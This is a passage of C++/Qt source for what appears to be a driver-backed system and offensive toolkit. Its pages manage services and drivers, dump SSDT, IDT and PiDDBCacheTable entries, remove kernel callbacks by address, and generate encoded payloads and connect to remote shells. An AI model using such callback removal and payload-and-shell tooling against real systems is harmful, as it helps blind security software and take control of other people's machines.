            std::wstring Wide(reinterpret_cast<const wchar_t*>(Svc.Name.utf16()), Svc.Name.size());
            SC_HANDLE Scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
            if (Scm) {
                SC_HANDLE S = OpenServiceW(Scm, Wide.c_str(), SERVICE_STOP);
                if (S) { SERVICE_STATUS St; ControlService(S, SERVICE_CONTROL_STOP, &St); CloseServiceHandle(S); }
                CloseServiceHandle(Scm);
            }
        });

        Menu->addSeparator();

        AddAct("Disable", [&Svc] {
            std::wstring Wide(reinterpret_cast<const wchar_t*>(Svc.Name.utf16()), Svc.Name.size());
            if (G_DeviceHandle != INVALID_HANDLE_VALUE && Svc.Type == SERVICE_KERNEL_DRIVER)
                ServiceDisable(Wide.c_str());
            else {
                SC_HANDLE Scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
                if (Scm) {
                    SC_HANDLE S = OpenServiceW(Scm, Wide.c_str(), SERVICE_CHANGE_CONFIG);
                    if (S) { ChangeServiceConfigW(S, SERVICE_NO_CHANGE, SERVICE_DISABLED, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL); CloseServiceHandle(S); }
                    CloseServiceHandle(Scm);
                }
            }
        });

        AddAct("Enable", [&Svc] {
            std::wstring Wide(reinterpret_cast<const wchar_t*>(Svc.Name.utf16()), Svc.Name.size());
            if (G_DeviceHandle != INVALID_HANDLE_VALUE && Svc.Type == SERVICE_KERNEL_DRIVER)
                ServiceEnable(Wide.c_str());
            else {
                SC_HANDLE Scm = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
                if (Scm) {
                    SC_HANDLE S = OpenServiceW(Scm, Wide.c_str(), SERVICE_CHANGE_CONFIG);
                    if (S) { ChangeServiceConfigW(S, SERVICE_NO_CHANGE, SERVICE_AUTO_START, SERVICE_NO_CHANGE, NULL, NULL, NULL, NULL, NULL, NULL, NULL); CloseServiceHandle(S); }
                    CloseServiceHandle(Scm);
                }
            }
        });

        ReleaseMenuAfterClose(Menu);
        Menu->exec(Table->viewport()->mapToGlobal(Pos));
    }

    SearchLineEdit *SearchEdit{};
    PushButton *RefreshButton{};
    TableWidget *Table{};
    std::vector<ServiceRow> Rows;
};

QWidget *CreateServiceManagerPage() { return new ServiceManagerPage; }

QWidget *CreateTablePage()
{
    struct TableQueryResult
    {
        SYSTEM_TABLES_OUTPUT Summary{};
        std::array<SYSTEM_TABLE_ENTRIES_OUTPUT, 5> Entries{};
        std::array<bool, 5> Available{};
        PIDDB_CACHE_ENUM_OUTPUT PiDDB{};
        bool PiDDBAvailable = false;
        DWORD ErrorCode = ERROR_SUCCESS;
        bool Success = false;
    };
    struct TablePageState
    {
        std::shared_ptr<TableQueryResult> Result = std::make_shared<TableQueryResult>();
        std::atomic_bool Refreshing = false;
    };

    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    ConfigurePageLayout(Layout);
    auto *Toolbar = new QHBoxLayout;
    ConfigureToolbarLayout(Toolbar);
    auto *Kind = new ComboBox; Kind->addItems({"InterruptDescriptorTable", "I/O Timer", "SSDT", "ShadowSSDT", "GlobalDescriptorTable", "PiDDBCacheTable"}); Kind->setCurrentIndex(0); Kind->setMinimumWidth(300);
    auto *Search = new SearchLineEdit;
    Search->setPlaceholderText("Search index, name, address, or metadata");
    Search->setClearButtonEnabled(true);
    Search->setMaximumWidth(380);
    auto *Status = new BodyLabel("Not queried.");
    auto *RefreshIndicator = new IndeterminateProgressRing(Page, false);
    RefreshIndicator->setFixedSize(22, 22);
    RefreshIndicator->hide();
    auto *Refresh = MakeButton("Refresh", true);
    Toolbar->addWidget(Kind);
    Toolbar->addWidget(Search);
    Toolbar->addStretch();
    Toolbar->addWidget(Status); Toolbar->addWidget(RefreshIndicator); Toolbar->addWidget(Refresh);
    Layout->addLayout(Toolbar);
    auto *Table = MakeTable({"Index", "Name", "Address", "Metadata"}); Table->horizontalHeader()->setSectionResizeMode(1, QHeaderView::Stretch); Table->horizontalHeader()->setSectionResizeMode(2, QHeaderView::Stretch); Layout->addWidget(Table, 1);
    const auto State = std::make_shared<TablePageState>();
    const auto Populate = [Kind, Search, Table, State] {
        Table->clearContents(); Table->setRowCount(0); const int Tab = Kind->currentIndex();
        const std::shared_ptr<TableQueryResult> Result = State->Result;
        const SYSTEM_TABLES_OUTPUT &Summary = Result->Summary;
        const QString SearchText = Search->text().trimmed();
        const auto AddRow = [Table, SearchText](const QString &Index, const QString &Name, const QString &Address, const QString &Metadata = QString()) { if (!SearchText.isEmpty() && !(Index + " " + Name + " " + Address + " " + Metadata).contains(SearchText, Qt::CaseInsensitive)) return; const int Row = Table->rowCount(); Table->insertRow(Row); Table->setItem(Row, 0, new QTableWidgetItem(Index)); Table->setItem(Row, 1, new QTableWidgetItem(Name)); Table->setItem(Row, 2, new QTableWidgetItem(Address)); Table->setItem(Row, 3, new QTableWidgetItem(Metadata)); Table->setRowHeight(Row, 38); };
        if (Tab < 5 && Result->Available[Tab]) { const auto &Output = Result->Entries[Tab]; AddRow("-", "Table Base", QString("0x%1").arg(Output.TableBase, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper(), QString("%1 of %2 entries").arg(Output.Count).arg(Output.TotalCount));
            for (ULONG Index = 0; Index < Output.Count; ++Index) { const SYSTEM_TABLE_ENTRY &Entry = Output.Entries[Index];
                AddRow(QString::number(Entry.Index), SystemTableEntryName(Tab, Entry), QString("0x%1").arg(Entry.Address, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper(), QString::number(Entry.ArgumentBytes)); } return; }
        if (Tab == 5 && Result->PiDDBAvailable) {
            AddRow("-", "PiDDBCacheTable", QString("0x%1").arg(Result->PiDDB.TableAddress, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper(),
                   QString("%1 of %2 entries").arg(Result->PiDDB.Count).arg(Result->PiDDB.TotalCount));
            for (ULONG Index = 0; Index < Result->PiDDB.Count; ++Index) {
                const PIDDB_CACHE_ENTRY_INFO &Entry = Result->PiDDB.Entries[Index];
                const QString Name = Entry.DriverName[0] ? QString::fromWCharArray(Entry.DriverName) : "(unknown)";
                const QString Address = QString("0x%1").arg(Entry.Address, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper();
                const QString Metadata = QString("TimeDateStamp: %1 | LoadStatus: 0x%2")
                    .arg(FormatPeTimeDateStamp(Entry.TimeDateStamp))
                    .arg(static_cast<quint32>(Entry.LoadStatus), 8, 16, QLatin1Char('0')).toUpper();
                AddRow(QString::number(Entry.Index), Name, Address, Metadata);
            }
            return;
        }
        const auto Hex = [](ULONG_PTR Value) { return QString("0x%1").arg(Value, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper(); };
        if (Tab == 0) { AddRow("-", "IDT Base", Hex(Summary.IdtBase)); AddRow("-", "IDT Limit", QString::number(Summary.IdtLimit)); }
        else if (Tab == 1) { AddRow("-", "KUSER_SHARED_DATA", Hex(Summary.KuserSharedData)); AddRow("-", "System Time", QString("0x%1").arg(Summary.SystemTime, 16, 16, QLatin1Char('0')).toUpper()); AddRow("-", "Interrupt Time", QString("0x%1").arg(Summary.InterruptTime, 16, 16, QLatin1Char('0')).toUpper()); AddRow("-", "Tick Count", QString::number(Summary.TickCount)); }
        else if (Tab == 2) { AddRow("-", "SSDT Base", Hex(Summary.SsdtBase)); AddRow("-", "Service Count", QString::number(Summary.SsdtCount)); AddRow("-", "Argument Table", Hex(Summary.SsdtArgTable)); }
        else if (Tab == 3) { AddRow("-", "Shadow SSDT Base", Hex(Summary.ShadowSsdtBase)); AddRow("-", "Service Count", QString::number(Summary.ShadowSsdtCount)); AddRow("-", "Argument Table", Hex(Summary.ShadowSsdtArgTable)); }
        else if (Tab == 4) { AddRow("-", "GDT Base", Hex(Summary.GdtBase)); AddRow("-", "GDT Limit", QString::number(Summary.GdtLimit)); }
        else AddRow("-", "PiDDBCacheTable", Hex(Summary.PiDDBCacheTable));
    };
    const auto Query = [Page, Status, Refresh, RefreshIndicator, State, Populate](bool ShowResult) {
        if (State->Refreshing.exchange(true))
            return;
        Refresh->setEnabled(false);
        Refresh->setText("Refreshing...");
        RefreshIndicator->show();
        RefreshIndicator->start();
        Status->setText("Reading system tables...");
        QPointer<QWidget> SafePage(Page);
        std::thread([SafePage, Status, Refresh, RefreshIndicator, State, Populate, ShowResult] {
            auto Result = std::make_shared<TableQueryResult>();
            Result->Success = QuerySystemTables(&Result->Summary) != FALSE;
            Result->ErrorCode = G_LastMultiDrvError;
            if (Result->Success)
            {
                for (ULONG TableKind = 0; TableKind < Result->Entries.size(); ++TableKind)
                    Result->Available[TableKind] =
                        QuerySystemTableEntries(TableKind, &Result->Entries[TableKind]) != FALSE;
                Result->PiDDBAvailable = QueryPiDDBCacheEntries(&Result->PiDDB) != FALSE;
                ServiceNamesForTable(SYSTEM_TABLE_KIND_SSDT);
                ServiceNamesForTable(SYSTEM_TABLE_KIND_SHADOW_SSDT);
            }
            QMetaObject::invokeMethod(qApp, [SafePage, Status, Refresh, RefreshIndicator, State, Populate,
                                             Result = std::move(Result), ShowResult] {
                if (!SafePage)
                    return;
                State->Result = Result;
                State->Refreshing = false;
                RefreshIndicator->stop();
                RefreshIndicator->hide();
                Refresh->setText("Refresh");
                Refresh->setEnabled(true);
                if (!Result->Success)
                {
                    const QString Message = QString("Query failed (error %1)").arg(Result->ErrorCode);
                    Status->setText(Message);
                    if (ShowResult)
                        ShowErrorNotice(SafePage, "Table", Message);
                }
                else
                {
                    const int AvailableCount = static_cast<int>(std::count(
                        Result->Available.begin(), Result->Available.end(), true)) + (Result->PiDDBAvailable ? 1 : 0);
                    Status->setText(QString("Updated from MultiDrv (%1/6 tables)").arg(AvailableCount));
                    if (ShowResult)
                        ShowSuccessNotice(SafePage, "Table", "System tables updated from MultiDrv.");
                }
                Populate();
            }, Qt::QueuedConnection);
        }).detach();
    };
    QObject::connect(Kind, &ComboBox::currentIndexChanged, Page, [Populate](int) { Populate(); }); QObject::connect(Search, &QLineEdit::textChanged, Page, [Populate] { Populate(); }); QObject::connect(Refresh, &QPushButton::clicked, Page, [Query] { Query(true); }); Query(false);
    return Page;
}

QWidget *CreateCallbackPage()
{
    const auto DescribeCallbackType = [](ULONG Type) {
        switch (Type)
        {
        case CALLBACK_TYPE_OB_PROCESS:
            return QString("ObProcess");
        case CALLBACK_TYPE_OB_THREAD:
            return QString("ObThread");
        case CALLBACK_TYPE_REGISTRY:
            return QString("Registry");
        case CALLBACK_TYPE_FLT_PRE_CREATE:
            return QString("FltCreate");
        case CALLBACK_TYPE_FLT_PRE_SET_INFORMATION:
            return QString("FltSetInfo");
        case CALLBACK_TYPE_FLT_PRE_WRITE:
            return QString("FltWrite");
        case CALLBACK_TYPE_FLT_PRE_READ:
            return QString("FltRead");
        case CALLBACK_TYPE_FLT_PRE_QUERY_INFORMATION:
            return QString("FltQueryInfo");
        case CALLBACK_TYPE_FLT_PRE_DIRECTORY_CONTROL:
            return QString("FltDirCtrl");
        case CALLBACK_TYPE_FLT_PRE_CLEANUP:
            return QString("FltCleanup");
        case CALLBACK_TYPE_FLT_PRE_CLOSE:
            return QString("FltClose");
        case CALLBACK_TYPE_FLT_POST_CREATE:
            return QString("FltPostCreate");
        case CALLBACK_TYPE_FLT_POST_READ:
            return QString("FltPostRead");
        case CALLBACK_TYPE_FLT_POST_QUERY_INFORMATION:
            return QString("FltPostQuery");
        case CALLBACK_TYPE_FLT_POST_SET_INFORMATION:
            return QString("FltPostSet");
        case CALLBACK_TYPE_FLT_POST_DIRECTORY_CONTROL:
            return QString("FltPostDir");
        case CALLBACK_TYPE_FLT_POST_WRITE:
            return QString("FltPostWrite");
        case CALLBACK_TYPE_FLT_POST_CLEANUP:
            return QString("FltPostCleanup");
        case CALLBACK_TYPE_FLT_POST_CLOSE:
            return QString("FltPostClose");
        case CALLBACK_TYPE_PS_PROCESS_NOTIFY:
            return QString("PsProcess");
        case CALLBACK_TYPE_PS_THREAD_NOTIFY:
            return QString("PsThread");
        case CALLBACK_TYPE_PS_IMAGE_NOTIFY:
            return QString("PsImage");
        case CALLBACK_TYPE_BUGCHECK:
            return QString("BugCheck");
        case CALLBACK_TYPE_BUGCHECK_REASON:
            return QString("BugChkReason");
        case CALLBACK_TYPE_SHUTDOWN:
            return QString("Shutdown");
        default:
            return QString("Unknown");
        }
    };
    struct CallbackPageState
    {
        std::vector<CALLBACK_ENTRY> Rows;
        std::atomic_bool Refreshing = false;
    };

    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    ConfigurePageLayout(Layout);
    auto *Toolbar = new QHBoxLayout;
    ConfigureToolbarLayout(Toolbar);
    auto *TypeFilter = new ComboBox;
    TypeFilter->addItems({"All", "ObProcess", "ObThread", "Registry", "PsProcess", "PsThread", "PsImage",
                          "BugCheck", "BugChkReason", "Shutdown", "FltCreate", "FltRead", "FltQueryInfo",
                          "FltSetInfo", "FltDirCtrl", "FltWrite", "FltCleanup", "FltClose",
                          "FltPostCreate", "FltPostRead", "FltPostQuery", "FltPostSet", "FltPostDir",
                          "FltPostWrite", "FltPostCleanup", "FltPostClose"});
    TypeFilter->setCurrentIndex(0);
    auto *Search = new SearchLineEdit;
    Search->setPlaceholderText("Search type, source, module, or address");
    Search->setClearButtonEnabled(true);
    Search->setMaximumWidth(420);
    auto *Status = new BodyLabel("Not queried.");
    auto *RefreshIndicator = new IndeterminateProgressRing(Page, false);
    RefreshIndicator->setFixedSize(22, 22);
    RefreshIndicator->hide();
    auto *Refresh = MakeButton("Refresh", true);
    Toolbar->addWidget(TypeFilter);
    Toolbar->addWidget(Search);
    Toolbar->addStretch();
    Toolbar->addWidget(Status);
    Toolbar->addWidget(RefreshIndicator);
    Toolbar->addWidget(Refresh);
    Layout->addLayout(Toolbar);
    auto *Table = MakeTable({"Type", "Address", "Module", "Source"});
    Table->setSelectionMode(QAbstractItemView::SingleSelection);
    Table->setContextMenuPolicy(Qt::CustomContextMenu);
    Table->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
    Table->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
    Table->horizontalHeader()->setSectionResizeMode(2, QHeaderView::Stretch);
    Table->horizontalHeader()->setSectionResizeMode(3, QHeaderView::Stretch);
    Layout->addWidget(Table, 1);
    const auto State = std::make_shared<CallbackPageState>();
    const auto Populate = [Search, TypeFilter, Table, State, DescribeCallbackType] { const QString Query = Search->text().trimmed(); const QString TypeFilterText = TypeFilter->currentText(); Table->clearContents(); Table->setRowCount(0); for (const CALLBACK_ENTRY &Entry : State->Rows) { const QString Type = DescribeCallbackType(Entry.Type);
        const QString Address = QString("0x%1").arg(Entry.Address, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper(); const QString Module = Entry.ModuleName[0] ? QString::fromWCharArray(Entry.ModuleName) : "(unknown)"; const QString Source = Entry.SourceName[0] ? QString::fromWCharArray(Entry.SourceName) : "(unknown)";
        if (TypeFilterText != "All" && Type != TypeFilterText) continue;
        if (!Query.isEmpty() && !(Type + " " + Address + " " + Module + " " + Source).contains(Query, Qt::CaseInsensitive)) continue; const int Row = Table->rowCount(); Table->insertRow(Row); auto *TypeItem = new QTableWidgetItem(Type); TypeItem->setData(Qt::UserRole, QVariant::fromValue<qulonglong>(Entry.Address)); TypeItem->setData(Qt::UserRole + 1, QVariant::fromValue<qulonglong>(Entry.Type)); TypeItem->setData(Qt::UserRole + 2, QVariant::fromValue<qulonglong>(Entry.Flags)); Table->setItem(Row, 0, TypeItem); Table->setItem(Row, 1, new QTableWidgetItem(Address)); Table->setItem(Row, 2, new QTableWidgetItem(Module)); Table->setItem(Row, 3, new QTableWidgetItem(Source)); Table->setRowHeight(Row, 38); } };
    const auto Query = [Page, Status, Refresh, RefreshIndicator, State, Populate, DescribeCallbackType](bool ShowResult) {
        if (State->Refreshing.exchange(true))
            return;
        Refresh->setEnabled(false);
        Refresh->setText("Refreshing...");
        RefreshIndicator->show();
        RefreshIndicator->start();
        Status->setText("Enumerating callbacks...");
        QPointer<QWidget> SafePage(Page);
        std::thread([SafePage, Status, Refresh, RefreshIndicator, State, Populate, DescribeCallbackType, ShowResult] {
            std::vector<CALLBACK_ENTRY> Rows;
            DWORD BytesReturned = 0;
            ULONG Count = 0;
            bool Success = SendIoctlWithOutput(IOCTL_ENUM_CALLBACKS, nullptr, 0, &Count, sizeof(Count),
                                               &BytesReturned) != FALSE;
            DWORD ErrorCode = G_LastMultiDrvError;
            if (Success && Count)
            {
                const DWORD Size = sizeof(CALLBACK_ENUM_OUTPUT) + (Count - 1) * sizeof(CALLBACK_ENTRY);
                std::vector<BYTE> Buffer(Size);
                auto *Output = reinterpret_cast<PCALLBACK_ENUM_OUTPUT>(Buffer.data());
                ZeroMemory(Output, Size);
                Success = SendIoctlWithOutput(IOCTL_ENUM_CALLBACKS, nullptr, 0, Output, Size,
                                              &BytesReturned) != FALSE;
                ErrorCode = G_LastMultiDrvError;
                if (Success)
                    Rows.assign(Output->Entries, Output->Entries + Output->Count);
            }
            QMetaObject::invokeMethod(qApp, [SafePage, Status, Refresh, RefreshIndicator, State, Populate,
                                             DescribeCallbackType, Rows = std::move(Rows), Success, ErrorCode,
                                             ShowResult]() mutable {
                if (!SafePage)
                    return;
                State->Refreshing = false;
                RefreshIndicator->stop();
                RefreshIndicator->hide();
                Refresh->setText("Refresh");
                Refresh->setEnabled(true);
                if (!Success)
                {
                    const QString Message = QString("Enumeration failed (error %1)").arg(ErrorCode);
                    Status->setText(Message);
                    if (ShowResult)
                        ShowErrorNotice(SafePage, "Callback", Message);
                }
                else
                {
                    State->Rows = std::move(Rows);
                    QMap<QString, int> Counts;
                    for (const CALLBACK_ENTRY &Entry : State->Rows)
                        Counts[DescribeCallbackType(Entry.Type)]++;
                    QStringList Summary;
                    for (auto It = Counts.cbegin(); It != Counts.cend(); ++It)
                        Summary.append(QString("%1:%2").arg(It.key()).arg(It.value()));
                    Status->setText(Summary.isEmpty()
                                        ? QString("0 callback(s)")
                                        : QString("%1 callback(s) | %2").arg(State->Rows.size()).arg(Summary.join(", ")));
                    if (ShowResult)
                        ShowSuccessNotice(SafePage, "Callback",
                                          QString("Enumerated %1 callback(s).").arg(State->Rows.size()));
                }
                Populate();
            }, Qt::QueuedConnection);
        }).detach();
    };
    QObject::connect(TypeFilter, &ComboBox::currentTextChanged, Page, [Populate](const QString &) { Populate(); });
    QObject::connect(Search, &QLineEdit::textChanged, Page, [Populate] { Populate(); }); QObject::connect(Refresh, &QPushButton::clicked, Page, [Query] { Query(true); });
    QObject::connect(Table, &QWidget::customContextMenuRequested, Page, [Page, Table, Query](const QPoint &Position) { const QModelIndex Index = Table->indexAt(Position); if (!Index.isValid()) return; Table->selectRow(Index.row()); auto *TypeItem = Table->item(Index.row(), 0); const ULONG_PTR Address = static_cast<ULONG_PTR>(TypeItem->data(Qt::UserRole).toULongLong()); const ULONG Type = static_cast<ULONG>(TypeItem->data(Qt::UserRole + 1).toULongLong()); const ULONG Flags = static_cast<ULONG>(TypeItem->data(Qt::UserRole + 2).toULongLong());
        auto *Menu = new RoundMenu(QString(), Page); auto *Remove = new QAction("Remove callback", Menu); Remove->setEnabled(true); Menu->addAction(Remove); QObject::connect(Remove, &QAction::triggered, Page, [Page = QPointer<QWidget>(Page), Address, Type, Query] { if (!Page) return; if (QMessageBox::warning(Page, "Callback", QString("Remove callback at 0x%1?").arg(Address, sizeof(ULONG_PTR) * 2, 16, QLatin1Char('0')).toUpper(), QMessageBox::Yes | QMessageBox::No, QMessageBox::No) != QMessageBox::Yes) return; CALLBACK_REMOVE_INPUT Input = {}; Input.Type = Type; Input.Address = Address; SendIoctl(IOCTL_REMOVE_CALLBACK_BY_ADDRESS, &Input, sizeof(Input)); if (G_LastMultiDrvError != ERROR_SUCCESS) ShowErrorNotice(Page, "Callback", QString("Operation failed (error %1)").arg(G_LastMultiDrvError)); else ShowSuccessNotice(Page, "Callback", "Callback removed successfully."); Query(false); }); ReleaseMenuAfterClose(Menu); Menu->exec(Table->viewport()->mapToGlobal(Position)); });
    if (TypeFilter->count() > 0)
        TypeFilter->setCurrentIndex(0);
    Query(false);
    return Page;
}

QWidget *CreatePayloadPage()
{
    const auto PayloadChoiceNames = [](const QString &Key) {
        QStringList Names{"None"};
        for (const QJsonValue &Value : ConfigurationValue("Payload", Key, QJsonArray()).toArray())
        {
            const QString Name = Value.toString().trimmed();
            if (Name.isEmpty() || Name.compare("None", Qt::CaseInsensitive) == 0 ||
                Name.compare("(None)", Qt::CaseInsensitive) == 0)
                continue;
            bool Duplicate = false;
            for (const QString &Existing : Names)
            {
                if (Existing.compare(Name, Qt::CaseInsensitive) == 0)
                {
                    Duplicate = true;
                    break;
                }
            }
            if (!Duplicate)
                Names.append(Name);
        }
        return Names;
    };
    const auto SetPayloadOption = [](ModuleEntry *Entry, const QStringList &Aliases, const QString &Value) {
        if (!Entry)
            return;
        SetCachedModuleOptionValue(*Entry, Aliases, Value);
    };

    auto *Page = new QWidget;
    auto *Layout = new QVBoxLayout(Page);
    ConfigurePageLayout(Layout);

    auto *Tabs = new TabBar;
    Tabs->setAddButtonVisible(false);
    Tabs->setTabsClosable(false);
    Tabs->setMovable(false);
    Tabs->addTab("generate", "Generate", Fluent::IconType::SEND);
    Tabs->addTab("shell", "Shell", Fluent::IconType::COMMAND_PROMPT);
    Tabs->setCurrentIndex(0);
    Layout->addWidget(Tabs);

    auto *Pages = new QStackedWidget;
    Layout->addWidget(Pages, 1);

    auto *GeneratePage = new QWidget;
    auto *GenerateLayout = new QVBoxLayout(GeneratePage);
    ConfigurePageLayout(GenerateLayout, 14);

    auto *ModuleCard = new SimpleCardWidget;
    ModuleCard->setBorderRadius(5);
    auto *ModuleCardLayout = new QVBoxLayout(ModuleCard);
    ModuleCardLayout->setContentsMargins(16, 16, 16, 16);
    ModuleCardLayout->setSpacing(10);
    ModuleCardLayout->addWidget(MakeLabel("Payload module", 12, KTextMuted, QFont::Normal));
    auto *ModuleRow = new QHBoxLayout;
    ConfigureToolbarLayout(ModuleRow);
    auto *Modules = new ComboBox;
    Modules->setMinimumWidth(240);
    auto *RefreshModules = MakeButton("Refresh");
    ModuleRow->addWidget(Modules, 1);
    ModuleRow->addWidget(RefreshModules);
    ModuleCardLayout->addLayout(ModuleRow);
    auto *Information = new BodyLabel("Select a payload module to generate output.");
    Information->setWordWrap(true);
    Information->setMinimumHeight(54);
    ModuleCardLayout->addWidget(Information);
    auto *TopLayout = new QHBoxLayout;
    ConfigureToolbarLayout(TopLayout, 14);
    TopLayout->addWidget(ModuleCard, 1);

    auto *OptionsCard = new SimpleCardWidget;
    OptionsCard->setBorderRadius(5);
    auto *OptionsCardLayout = new QGridLayout(OptionsCard);
    OptionsCardLayout->setContentsMargins(16, 16, 16, 16);
    OptionsCardLayout->setHorizontalSpacing(10);
    OptionsCardLayout->setVerticalSpacing(12);
    auto *Browse = MakeButton("Browse");
    auto *Encoder = new ComboBox;
    auto *Nop = new ComboBox;
    auto *OutputPath = new LineEdit;
    auto *Generate = MakeButton("Generate", true);
    Encoder->addItems(PayloadChoiceNames("Encoder"));
    Nop->addItems(PayloadChoiceNames("Nop"));
    Encoder->setCurrentIndex(0);
    Nop->setCurrentIndex(0);
    OutputPath->setPlaceholderText("Path and filename");
    OptionsCardLayout->addWidget(MakeLabel("Encoder", 12, KTextMuted, QFont::Normal), 0, 0);
    OptionsCardLayout->addWidget(Encoder, 0, 1, 1, 2);
    OptionsCardLayout->addWidget(MakeLabel("Nop", 12, KTextMuted, QFont::Normal), 1, 0);
    OptionsCardLayout->addWidget(Nop, 1, 1, 1, 2);
    OptionsCardLayout->addWidget(MakeLabel("Output file", 12, KTextMuted, QFont::Normal), 2, 0);
    OptionsCardLayout->addWidget(OutputPath, 2, 1);
    OptionsCardLayout->addWidget(Browse, 2, 2);
    OptionsCardLayout->addWidget(Generate, 3, 2);
    OptionsCardLayout->setColumnStretch(1, 1);
    TopLayout->addWidget(OptionsCard, 1);
    GenerateLayout->addLayout(TopLayout);

    auto *OutputToolbar = new QHBoxLayout;
    ConfigureToolbarLayout(OutputToolbar);
    auto *OutputButton = MakeButton("Module Output");
    OutputButton->setSizePolicy(QSizePolicy::Maximum, QSizePolicy::Preferred);
    OutputToolbar->addStretch();
    OutputToolbar->addWidget(OutputButton);

    auto *ParametersToolbar = new QHBoxLayout;
    ConfigureToolbarLayout(ParametersToolbar);
    auto *ParametersLabel = MakeLabel("Parameters", 13, KTextPrimary, QFont::DemiBold);
    ParametersToolbar->addWidget(ParametersLabel);
    ParametersToolbar->addStretch();
    auto *Parameters = new TableWidget;
    InstallFluentScrollBar(Parameters, Qt::Vertical);
    InstallFluentScrollBar(Parameters, Qt::Horizontal);
    Parameters->setColumnCount(4);
    Parameters->setRowCount(0);
    Parameters->setHorizontalHeaderLabels({"Option", "Type", "Value", "Description"});
    Parameters->horizontalHeader()->setSectionResizeMode(0, QHeaderView::ResizeToContents);
    Parameters->horizontalHeader()->setSectionResizeMode(1, QHeaderView::ResizeToContents);
    Parameters->horizontalHeader()->setSectionResizeMode(2, QHeaderView::Stretch);
    Parameters->horizontalHeader()->setSectionResizeMode(3, QHeaderView::Stretch);
    Parameters->verticalHeader()->hide();
    Parameters->setSelectionMode(QAbstractItemView::NoSelection);
    Parameters->setEditTriggers(QAbstractItemView::NoEditTriggers);
    Parameters->setMinimumHeight(180);
    GenerateLayout->addLayout(ParametersToolbar);
    GenerateLayout->addWidget(Parameters);

    GenerateLayout->addLayout(OutputToolbar);
    Pages->addWidget(GeneratePage);

    auto *ShellPage = new QWidget;
    auto *ShellLayout = new QVBoxLayout(ShellPage);
    ConfigurePageLayout(ShellLayout, 14);
    const auto ShellState = std::make_shared<PayloadShellState>();
    ShellState->Page = ShellPage;

    auto *ConnectionCard = new SimpleCardWidget;
    ConnectionCard->setBorderRadius(5);
    ConnectionCard->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Maximum);
    auto *ConnectionLayout = new QHBoxLayout(ConnectionCard);
    ConnectionLayout->setContentsMargins(16, 16, 16, 16);
    ConnectionLayout->setSpacing(14);
    auto *HostListCard = new QWidget;
    HostListCard->setMinimumWidth(280);
    auto *HostListLayout = new QVBoxLayout(HostListCard);
    HostListLayout->setContentsMargins(0, 0, 0, 0);
    HostListLayout->setSpacing(10);
    HostListLayout->addWidget(MakeLabel("Hosts", 12, KTextMuted, QFont::Normal));
    auto *HostList = new QListWidget;
    HostList->setMinimumHeight(96);
    HostList->setMaximumHeight(160);
    HostList->setSizePolicy(QSizePolicy::Expanding, QSizePolicy::Preferred);
    HostList->setSelectionMode(QAbstractItemView::SingleSelection);
    HostList->setAlternatingRowColors(false);
    InstallFluentScrollBar(HostList, Qt::Vertical);
    HostListLayout->addWidget(HostList, 1);
    auto *ListButtons = new QHBoxLayout;
    ConfigureToolbarLayout(ListButtons, 8);
    auto *NewHostButton = MakeButton("New");
    auto *SaveHostButton = MakeButton("Save");
    auto *RemoveHostButton = MakeButton("Remove");
    ListButtons->addWidget(NewHostButton);
    ListButtons->addWidget(SaveHostButton);
    ListButtons->addWidget(RemoveHostButton);
    ListButtons->addStretch();
    HostListLayout->addLayout(ListButtons);
    ConnectionLayout->addWidget(HostListCard);

    auto *EditorHost = new QWidget;
    auto *EditorLayout = new QGridLayout(EditorHost);
    EditorLayout->setContentsMargins(0, 0, 0, 0);
    EditorLayout->setHorizontalSpacing(10);
    EditorLayout->setVerticalSpacing(12);
    auto *HostEdit = new LineEdit;
    HostEdit->setPlaceholderText("127.0.0.1");
    auto *PortEdit = new LineEdit;
    PortEdit->setPlaceholderText("4444");
    PortEdit->setMaximumWidth(100);
    auto *PasswordEdit = new LineEdit;
    PasswordEdit->setPlaceholderText("Password");
    PasswordEdit->setEchoMode(QLineEdit::Password);
    auto *CommandButton = MakeButton("Command");
    auto *ConnectButton = MakeButton("Connect", true);
    auto *DisconnectButton = MakeButton("Disconnect");
    EditorLayout->addWidget(MakeLabel("Host", 12, KTextMuted, QFont::Normal), 0, 0);
    EditorLayout->addWidget(HostEdit, 0, 1, 1, 3);
    EditorLayout->addWidget(MakeLabel("Port", 12, KTextMuted, QFont::Normal), 1, 0);
    EditorLayout->addWidget(PortEdit, 1, 1);
    EditorLayout->addWidget(MakeLabel("Password", 12, KTextMuted, QFont::Normal), 1, 2);
    EditorLayout->addWidget(PasswordEdit, 1, 3);
    EditorLayout->addWidget(CommandButton, 2, 1);
    EditorLayout->addWidget(ConnectButton, 2, 2);
    EditorLayout->addWidget(DisconnectButton, 2, 3);
    EditorLayout->setColumnStretch(1, 1);
    EditorLayout->setColumnStretch(3, 1);
    ConnectionLayout->addWidget(EditorHost, 1);
    ShellLayout->addWidget(ConnectionCard);

    Pages->addWidget(ShellPage);

    ShellState->HostList = HostList;
    ShellState->HostEdit = HostEdit;
    ShellState->PortEdit = PortEdit;
    ShellState->PasswordEdit = PasswordEdit;
    ShellState->CommandButton = CommandButton;
    ShellState->NewHostButton = NewHostButton;
    ShellState->SaveHostButton = SaveHostButton;
    ShellState->RemoveHostButton = RemoveHostButton;
    ShellState->ConnectButton = ConnectButton;
    ShellState->DisconnectButton = DisconnectButton;

    const auto CreateHostItem = [ShellState](const QString &Host, const QString &Port, const QString &Password = QString()) {
        auto *Item = new QListWidgetItem;
        PayloadShellCreateSession(ShellState, Item, Host, Port, Password);
        return Item;
    };
    std::function<void(QListWidgetItem *)> LoadHostToEditors;
    std::function<bool()> SaveSelectedHost;
    LoadHostToEditors = [ShellState](QListWidgetItem *Item) {
